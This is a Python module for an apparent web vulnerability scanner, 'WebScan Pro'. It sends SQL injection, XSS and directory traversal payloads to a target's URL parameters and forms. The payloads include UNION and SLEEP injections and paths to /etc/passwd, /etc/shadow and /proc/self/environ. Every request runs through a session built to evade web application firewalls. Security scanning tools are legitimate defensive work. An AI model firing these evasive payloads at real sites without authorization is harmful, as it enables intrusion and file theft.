"""
Active Scanner for WebScan Pro.
Performs SQL Injection, XSS, and Directory Traversal testing.
ALL requests use StealthSession for WAF evasion.
"""

import asyncio
import logging
import random
import re
import time
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from bs4 import BeautifulSoup

from utils.stealth import StealthSession, PayloadEncoder, get_realistic_headers

logger = logging.getLogger("webscanpro.active_scanner")


class ActiveScanner:
    """
    Active vulnerability scanner using StealthSession for every request.
    Tests: SQL Injection, Cross-Site Scripting (XSS), Directory Traversal.
    """

    def __init__(
        self,
        target_url: str,
        language: str = "en",
        timeout: int = 15,
        max_retries: int = 3,
    ):
        self.target_url = target_url.rstrip("/")
        self.language = language
        self.timeout = timeout
        self.max_retries = max_retries
        self.parsed = urlparse(self.target_url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.vulnerabilities: List[Dict] = []
        self._seen_findings: Set[str] = set()

    async def run(self) -> List[Dict]:
        """
        Execute all active scan tests using StealthSession.
        """
        logger.info(f"Starting active scan for {self.target_url}")

        async with StealthSession(
            target_url=self.target_url,
            timeout=self.timeout,
            max_retries=self.max_retries,
        ) as session:
            # Warm up the session
            await session.warm_up()

            # Run SQL Injection tests
            sqli_results = await self._test_sql_injection(session)
            self.vulnerabilities.extend(sqli_results)

            # Run XSS tests
            xss_results = await self._test_xss(session)
            self.vulnerabilities.extend(xss_results)

            # Run Directory Traversal tests
            traversal_results = await self._test_directory_traversal(session)
            self.vulnerabilities.extend(traversal_results)

        logger.info(
            f"Active scan complete for {self.target_url}: "
            f"{len(self.vulnerabilities)} findings"
        )
        return self.vulnerabilities

    def _is_duplicate(self, vuln_type: str, parameter: str) -> bool:
        """Check if a finding with same vuln_type+parameter already exists."""
        key = f"{vuln_type}:{parameter}"
        if key in self._seen_findings:
            return True
        self._seen_findings.add(key)
        return False

    async def _fetch_baseline(
        self, session: StealthSession, url: str
    ) -> Tuple[str, int]:
        """Fetch a URL without payload and return (text, length) baseline."""
        try:
            resp = await session.get(url, evade=False)
            text = resp.text
            return text, len(text)
        except Exception as e:
            logger.debug(f"Baseline fetch failed for {url}: {e}")
            return "", 0

    async def _extract_forms(self, session: StealthSession) -> List[Dict]:
        """Extract forms from the target page using BeautifulSoup."""
        forms = []
        try:
            response = await session.get(self.target_url)
            soup = BeautifulSoup(response.text, "html.parser")

            for form_tag in soup.find_all("form"):
                action = form_tag.get("action", "") or ""
                method = (form_tag.get("method", "get") or "get").upper()

                inputs = []
                for input_tag in form_tag.find_all("input"):
                    input_name = input_tag.get("name")
                    if input_name:
                        inputs.append(
                            {
                                "name": input_name,
                                "type": input_tag.get("type", "text") or "text",
                            }
                        )

                # Also capture textarea and select elements
                for textarea_tag in form_tag.find_all("textarea"):
                    ta_name = textarea_tag.get("name")
                    if ta_name:
                        inputs.append({"name": ta_name, "type": "text"})

                for select_tag in form_tag.find_all("select"):
                    sel_name = select_tag.get("name")
                    if sel_name:
                        inputs.append({"name": sel_name, "type": "text"})

                # Resolve action URL
                if action and not action.startswith("http"):
                    action = urljoin(self.target_url, action)

                forms.append(
                    {
                        "action": action or self.target_url,
                        "method": method if method in ("GET", "POST") else "GET",
                        "inputs": inputs,
                    }
                )
        except Exception as e:
            logger.debug(f"Form extraction failed: {e}")

        return forms

    async def _extract_url_params(
        self, session: StealthSession
    ) -> List[Tuple[str, str]]:
        """
        Crawl the target page and extract (url, param_name) pairs.
        Discovers parameters from: target URL's own query string, links with query params on page.
        Falls back to common defaults if nothing found.
        """
        pairs: List[Tuple[str, str]] = []
        seen_params: Set[str] = set()

        # 1) Parameters from the target URL's own query string
        own_params = parse_qs(self.parsed.query)
        for p in own_params:
            if p not in seen_params:
                seen_params.add(p)
                pairs.append((self.target_url, p))

        # 2) Links with query parameters found on the page
        try:
            response = await session.get(self.target_url)
            soup = BeautifulSoup(response.text, "html.parser")
            for a_tag in soup.find_all("a", href=True):
                href = a_tag["href"]
                if "?" in href:
                    link_url = urljoin(self.target_url, href)
                    link_params = parse_qs(urlparse(link_url).query)
                    for p in link_params:
                        if p not in seen_params:
                            seen_params.add(p)
                            pairs.append((link_url, p))
        except Exception as e:
            logger.debug(f"Failed to extract URL params from page: {e}")

        # 3) Fallback to common default params if none found
        if not pairs:
            defaults = [
                "id",
                "page",
                "q",
                "search",
                "cat",
                "product",
                "user",
                "content",
            ]
            for p in defaults:
                pairs.append((self.target_url, p))

        return pairs

    async def _test_sql_injection(self, session: StealthSession) -> List[Dict]:
        """Test for SQL Injection vulnerabilities using multi-signal detection."""
        findings = []
        url_params = await self._extract_url_params(session)
        forms = await self._extract_forms(session)
        request_count = 0

        # SQL error signatures for Condition A (error-based detection)
        error_signatures = [
            "sql syntax",
            "mysql_fetch",
            "ora-",
            "microsoft sql",
            "sqlite_",
            "postgresql",
            "warning:",
            "unclosed quotation",
            "syntax error",
            "invalid query",
            "sql command",
            "odbc",
            "jdbc",
            "you have an error in your sql",
            "quoted string not properly terminated",
            "conversion failed",
            "supplied argument is not",
        ]

        # Generic error strings that indicate a non-SQL error (for Condition B filtering)
        generic_error_signatures = [
            "404",
            "not found",
            "forbidden",
            "access denied",
            "error 500",
        ]

        # Error-based payloads
        error_payloads = [
            "'",
            '"',
            "1'",
            "1' -- -",
            "' OR 1=1-- -",
            "' UNION SELECT NULL-- -",
            "' UNION SELECT 1,2,3-- -",
            "1' ORDER BY 1-- -",
            "1' ORDER BY 100-- -",
        ]

        # Time-based payloads (only these trigger Condition C)
        time_payloads = [
            "1' OR SLEEP(5)-- -",
            "1' OR pg_sleep(5)-- -",
            "1' WAITFOR DELAY '0:0:5'-- -",
            "1' AND SLEEP(5)-- -",
        ]

        # Combine all payloads into one sequence per parameter
        # error_payloads first, then time_payloads
        all_payloads = [
            *[(p, "error") for p in error_payloads],
            *[(p, "time") for p in time_payloads],
        ]

        # ─────────────────────────────────────────────────────────
        # URL PARAMETER TESTING
        # ─────────────────────────────────────────────────────────
        for target_url, param in url_params:
            if len(findings) >= 30:
                break

            # Fix 5: Deduplication — skip if param already confirmed
            if self._is_duplicate("sql_injection", param):
                logger.info(f"SQLi confirmed on {param}, skipping remaining payloads")
                continue

            # Fix 1: Fetch baseline before SQLi testing
            try:
                response_baseline = await session.get(target_url, evade=False)
                baseline_length = len(response_baseline.text)
            except Exception as e:
                logger.debug(f"Baseline fetch failed for {target_url}: {e}")
                baseline_length = 0

            # Fix 2: Parse URL and substitute parameter value with payload
            parsed_url = urlparse(target_url)
            base_query = parse_qs(parsed_url.query, keep_blank_values=True)

            param_confirmed = False

            for payload, payload_type in all_payloads:
                if len(findings) >= 30 or param_confirmed:
                    break

                # Fix 6: Logging before testing
                logger.info(f"Testing SQLi on parameter '{param}' at {target_url}")

                # Build URL with payload substituted into the parameter
                inject_query = dict(base_query)
                inject_query[param] = [payload]
                new_query_string = urlencode(inject_query, doseq=True)
                inject_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query_string}"

                try:
                    if payload_type == "time":
                        # Fix 3 Condition C: Time-based detection
                        # Set timeout to 10s for time-based payloads
                        start_time = time.monotonic()

                        # Use a shorter timeout for time-based tests
                        response = await session.get(inject_url, timeout=10)
                        elapsed = time.monotonic() - start_time

                        if elapsed > 4.0:
                            logger.warning(
                                f"SQLi found: param='{param}', condition='time-based', "
                                f"payload='{payload}'"
                            )
                            param_confirmed = True
                            findings.append(
                                {
                                    "type": "sql_injection",
                                    "severity": "critical",
                                    "title": (
                                        f"Time-based SQL Injection in '{param}'"
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Zaman tabanlı SQL Enjeksiyonu"
                                    ),
                                    "description": (
                                        f"Time-based SQL Injection detected in parameter '{param}'. "
                                        f"Response took {elapsed:.1f}s indicating sleep command executed."
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Zaman tabanlı SQL Enjeksiyonu tespit edildi. "
                                        f"Yanıt {elapsed:.1f}s sürdü, SLEEP komutunun çalıştığını gösteriyor."
                                    ),
                                    "url": target_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": f"Response time: {elapsed:.1f}s (payload: {payload[:40]}...)",
                                    "remediation": (
                                        "Use parameterized queries or prepared statements."
                                        if self.language == "en"
                                        else "Parametreli sorgular veya hazır ifadeler kullanın."
                                    ),
                                    "cvss_score": 9.0,
                                }
                            )
                            continue

                    else:
                        # Regular (non-time-based) payload
                        response = await session.get(inject_url)
                        body_lower = response.text.lower()

                        # Fix 3 Condition A: Error-based detection
                        has_error_signature = any(
                            sig in body_lower for sig in error_signatures
                        )

                        if has_error_signature:
                            logger.warning(
                                f"SQLi found: param='{param}', condition='error-based', "
                                f"payload='{payload}'"
                            )
                            param_confirmed = True
                            findings.append(
                                {
                                    "type": "sql_injection",
                                    "severity": "critical",
                                    "title": (
                                        f"SQL Injection in parameter '{param}'"
                                        if self.language == "en"
                                        else f"'{param}' parametresinde SQL Enjeksiyonu"
                                    ),
                                    "description": (
                                        f"SQL Injection vulnerability detected via parameter '{param}'. "
                                        f"Payload triggered SQL error signature."
                                        if self.language == "en"
                                        else f"'{param}' parametresinde SQL Enjeksiyonu açığı tespit edildi. "
                                        f"Payload SQL hatası oluşturdu."
                                    ),
                                    "url": target_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": f"HTTP {response.status_code} - SQL error pattern matched in response",
                                    "remediation": (
                                        "Use parameterized queries or prepared statements. "
                                        "Sanitize all user inputs."
                                        if self.language == "en"
                                        else "Parametreli sorgular veya hazır ifadeler kullanın. "
                                        "Tüm kullanıcı girdilerini temizleyin."
                                    ),
                                    "cvss_score": 9.0,
                                }
                            )
                            continue

                        # Fix 3 Condition B: Blind SQLi detection (response length change)
                        body_len = len(response.text)
                        length_diff = abs(body_len - baseline_length)

                        has_generic_error = any(
                            sig in body_lower for sig in generic_error_signatures
                        )

                        if (
                            length_diff > 50
                            and length_diff > (baseline_length * 0.02)
                            and response.status_code == 200
                            and not has_generic_error
                            and body_len > 200
                        ):
                            logger.warning(
                                f"SQLi found: param='{param}', condition='blind', "
                                f"payload='{payload}'"
                            )
                            param_confirmed = True
                            findings.append(
                                {
                                    "type": "sql_injection",
                                    "severity": "high",
                                    "title": (
                                        f"Blind SQL Injection in '{param}'"
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Blind SQL Enjeksiyonu"
                                    ),
                                    "description": (
                                        f"Blind SQL Injection detected in parameter '{param}'. "
                                        f"Response length changed from {baseline_length} to {body_len}."
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Blind SQL Enjeksiyonu tespit edildi. "
                                        f"Yanıt uzunluğu {baseline_length}'den {body_len}'e değişti."
                                    ),
                                    "url": target_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": (
                                        f"Response length changed: {baseline_length} → {body_len} "
                                        f"(diff={length_diff})"
                                    ),
                                    "remediation": (
                                        "Use parameterized queries or prepared statements."
                                        if self.language == "en"
                                        else "Parametreli sorgular veya hazır ifadeler kullanın."
                                    ),
                                    "cvss_score": 8.5,
                                }
                            )
                            continue

                except Exception as e:
                    logger.warning(
                        f"SQLi request failed for {param} on {target_url}: {e}"
                    )
                    continue

            # Fix 4: Rate limiting — after every 5 requests to same domain
            request_count += 1
            if request_count % 5 == 0:
                sleep_time = random.uniform(2.0, 4.0)
                await asyncio.sleep(sleep_time)

        # ─────────────────────────────────────────────────────────
        # FORM TESTING (unchanged logic, updated error signatures)
        # ─────────────────────────────────────────────────────────
        for form in forms:
            for input_field in form["inputs"]:
                if input_field["type"] in ("text", "search", "hidden", ""):
                    payload = "' OR '1'='1"
                    try:
                        form_data = {
                            inp["name"]: (
                                payload
                                if inp["name"] == input_field["name"]
                                else "test"
                            )
                            for inp in form["inputs"]
                        }

                        if form["method"] == "POST":
                            response = await session.post(
                                form["action"], data=form_data, evade=True
                            )
                        else:
                            response = await session.get(
                                form["action"], params=form_data, evade=True
                            )

                        body_lower = response.text.lower()
                        for sig in error_signatures:
                            if sig in body_lower:
                                if not self._is_duplicate(
                                    "sql_injection", input_field["name"]
                                ):
                                    findings.append(
                                        {
                                            "type": "sql_injection",
                                            "severity": "critical",
                                            "title": (
                                                f"SQL Injection in form field '{input_field['name']}'"
                                                if self.language == "en"
                                                else f"Form alanında SQL Enjeksiyonu: '{input_field['name']}'"
                                            ),
                                            "description": (
                                                f"SQL Injection found in form field '{input_field['name']}'."
                                                if self.language == "en"
                                                else f"Form alanında SQL Enjeksiyonu bulundu: "
                                                f"'{input_field['name']}'."
                                            ),
                                            "url": form["action"],
                                            "parameter": input_field["name"],
                                            "payload": payload,
                                            "evidence": f"SQL error signature matched: {sig}",
                                            "remediation": (
                                                "Use parameterized queries or prepared statements."
                                                if self.language == "en"
                                                else "Parametreli sorgular veya hazır ifadeler kullanın."
                                            ),
                                            "cvss_score": 9.0,
                                        }
                                    )
                                break

                    except Exception as e:
                        logger.debug(f"Form SQLi test error: {e}")

        return findings

    async def _test_xss(self, session: StealthSession) -> List[Dict]:
        """Test for Cross-Site Scripting (XSS) vulnerabilities on all discovered URL-param pairs."""
        findings = []
        url_params = await self._extract_url_params(session)
        forms = await self._extract_forms(session)

        # XSS payloads
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '"><script>alert(1)</script>',
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "'-alert(1)-'",
            '"-alert(1)-"',
        ]

        # Test each (url, param) pair with every XSS payload
        for target_url, param in url_params:
            if len(findings) >= 20:
                break
            for payload in xss_payloads:
                if len(findings) >= 20:
                    break
                try:
                    test_params = {param: payload}
                    response = await session.get(
                        target_url, params=test_params, evade=True
                    )

                    if (
                        payload in response.text
                        or payload.replace("'", "&#39;") in response.text
                    ):
                        if not self._is_duplicate("xss", param):
                            findings.append(
                                {
                                    "type": "xss",
                                    "severity": "high",
                                    "title": (
                                        f"Reflected XSS in parameter '{param}'"
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Yansıyan XSS"
                                    ),
                                    "description": (
                                        f"Reflected Cross-Site Scripting detected in parameter '{param}'. "
                                        "Payload is reflected in the response without proper sanitization."
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Yansıyan Siteler Arası Betik Çalıştırma "
                                        "(XSS) tespit edildi. Payload yanıtta düzgün temizlenmeden yansıtılıyor."
                                    ),
                                    "url": target_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": f"Payload reflected in response: {payload[:50]}...",
                                    "remediation": (
                                        "Sanitize and encode all user input before rendering. "
                                        "Use Content-Security-Policy header."
                                        if self.language == "en"
                                        else "Tüm kullanıcı girdilerini işlemeden önce temizleyin ve kodlayın. "
                                        "Content-Security-Policy başlığı kullanın."
                                    ),
                                    "cvss_score": 6.1,
                                }
                            )
                        break
                except Exception as e:
                    logger.debug(f"XSS test error for {param} on {target_url}: {e}")

        # Test forms for XSS
        for form in forms:
            for payload in xss_payloads:
                if len(findings) >= 20:
                    break
                for input_field in form["inputs"]:
                    if input_field["type"] in ("text", "search", "hidden", ""):
                        try:
                            form_data = {
                                inp["name"]: (
                                    payload
                                    if inp["name"] == input_field["name"]
                                    else "test"
                                )
                                for inp in form["inputs"]
                            }

                            if form["method"] == "POST":
                                response = await session.post(
                                    form["action"], data=form_data, evade=True
                                )
                            else:
                                response = await session.get(
                                    form["action"], params=form_data, evade=True
                                )

                            if payload in response.text:
                                if not self._is_duplicate("xss", input_field["name"]):
                                    findings.append(
                                        {
                                            "type": "xss",
                                            "severity": "high",
                                            "title": (
                                                f"Stored/Reflected XSS in form field '{input_field['name']}'"
                                                if self.language == "en"
                                                else f"Form alanında XSS: '{input_field['name']}'"
                                            ),
                                            "description": (
                                                f"XSS vulnerability detected in form field "
                                                f"'{input_field['name']}'."
                                                if self.language == "en"
                                                else f"'{input_field['name']}' form alanında XSS açığı tespit edildi."
                                            ),
                                            "url": form["action"],
                                            "parameter": input_field["name"],
                                            "payload": payload,
                                            "evidence": f"Payload reflected: {payload[:50]}...",
                                            "remediation": (
                                                "Sanitize all user input. Implement proper output encoding."
                                                if self.language == "en"
                                                else "Tüm kullanıcı girdilerini temizleyin. "
                                                "Uygun çıktı kodlaması uygulayın."
                                            ),
                                            "cvss_score": 6.1,
                                        }
                                    )
                                break
                        except Exception as e:
                            logger.debug(f"Form XSS test error: {e}")

        return findings

    async def _test_directory_traversal(self, session: StealthSession) -> List[Dict]:
        """Test for Directory Traversal vulnerabilities on all discovered URL-param pairs."""
        findings = []
        url_params = await self._extract_url_params(session)

        # Directory traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/shadow",
            "../../../../etc/hosts",
            "../../../../proc/self/environ",
            "....//....//....//etc/passwd",
            "..;/..;/../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
        ]

        # Multi-signal traversal detection patterns
        traversal_signatures = [
            "root:",
            "daemon:",
            "[boot loader]",
            "[fonts]",
            "for 16-bit app support",
            "PATH=",
            "HOME=",
            "SHELL=",
            "/bin/bash",
            "nobody:x:",
        ]

        # Build baseline for each URL
        baselines: Dict[str, int] = {}
        for target_url, param in url_params:
            key = f"{target_url}:{param}"
            _, bl = await self._fetch_baseline(session, target_url)
            baselines[key] = bl

        for target_url, param in url_params:
            if len(findings) >= 15:
                break
            for payload in traversal_payloads:
                if len(findings) >= 15:
                    break
                try:
                    response = await session.get(
                        target_url, params={param: payload}, evade=True
                    )
                    body = response.text
                    body_lower = body.lower()

                    # Signal 1: Status 200
                    signal_status = response.status_code == 200

                    # Signal 2: Response length differs from baseline by >15%
                    baseline_len = baselines.get(f"{target_url}:{param}", 0)
                    signal_length = (
                        baseline_len > 0
                        and abs(len(body) - baseline_len) > baseline_len * 0.15
                    )

                    # Signal 3: Body contains traversal signatures
                    signal_signature = any(
                        sig.lower() in body_lower for sig in traversal_signatures
                    )

                    # Count active signals
                    active_signals = sum(
                        [signal_status, signal_length, signal_signature]
                    )

                    # Flag as vulnerable if ANY TWO signals are true
                    if active_signals >= 2:
                        if not self._is_duplicate("traversal", param):
                            evidence_parts = []
                            if signal_signature:
                                evidence_parts.append("Content signature matched")
                            if signal_length:
                                evidence_parts.append(
                                    f"Response length changed: {baseline_len} → {len(body)}"
                                )
                            if signal_status:
                                evidence_parts.append(f"HTTP {response.status_code}")
                            evidence = "; ".join(evidence_parts)

                            findings.append(
                                {
                                    "type": "traversal",
                                    "severity": "high",
                                    "title": (
                                        f"Directory Traversal in parameter '{param}'"
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Dizin Gezinme Açığı"
                                    ),
                                    "description": (
                                        f"Directory Traversal vulnerability detected in parameter "
                                        f"'{param}'. Multi-signal detection triggered "
                                        f"({active_signals}/3 signals)."
                                        if self.language == "en"
                                        else f"'{param}' parametresinde Dizin Gezinme açığı tespit edildi. "
                                        f"Çoklu sinyal tespiti tetiklendi ({active_signals}/3 sinyal)."
                                    ),
                                    "url": target_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": evidence,
                                    "remediation": (
                                        "Validate and sanitize file path inputs. "
                                        "Use a whitelist of allowed files."
                                        if self.language == "en"
                                        else "Dosya yolu girdilerini doğrulayın ve temizleyin. "
                                        "İzin verilen dosyaların beyaz listesini kullanın."
                                    ),
                                    "cvss_score": 7.5,
                                }
                            )
                        break
                except Exception as e:
                    logger.debug(
                        f"Traversal test error for {param} on {target_url}: {e}"
                    )

        return findings
